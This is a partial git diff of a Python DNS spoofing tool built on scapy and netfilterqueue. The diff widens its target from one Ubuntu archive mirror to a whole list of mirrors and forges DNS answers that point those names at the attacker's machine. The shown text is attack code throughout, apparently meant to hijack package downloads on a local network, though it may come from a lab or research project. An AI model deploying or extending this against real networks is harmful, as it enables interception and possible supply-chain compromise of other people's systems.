@@ -1,7 +1,7 @@
 from scapy.all import IP, DNS, DNSRR, DNSQR, UDP, get_if_addr
 from netfilterqueue import NetfilterQueue
 import os
-from mirrors import getListOfMirrors
+from mirrors import get_list_of_mirrors
 
 def dns_spoof(interface):
     global iface
@@ -37,11 +37,11 @@ def process_packet(packet):
 
 def modify_packet(packet):
     qname = packet[DNSQR].qname
-    # print("Getting list of mirrors")
-    # mirrors = getListOfMirrors()
-    # Commented put bc I need to research how exactly the DNS qname stuff works, bc it seems slightly strange and I am too tired to do it right now haha
-    # if qname in mirrrors:
-    if qname == b"nl.archive.ubuntu.com.":
+    qname_dec = qname.decode('utf-8')
+    # if qname == b"nl.archive.ubuntu.com.":
+    mirrors = get_list_of_mirrors()
+    qnames = [link + "." for link in mirrors]
+    if qname_dec in qnames:
         packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))
 
         packet[DNS].ancount = 1
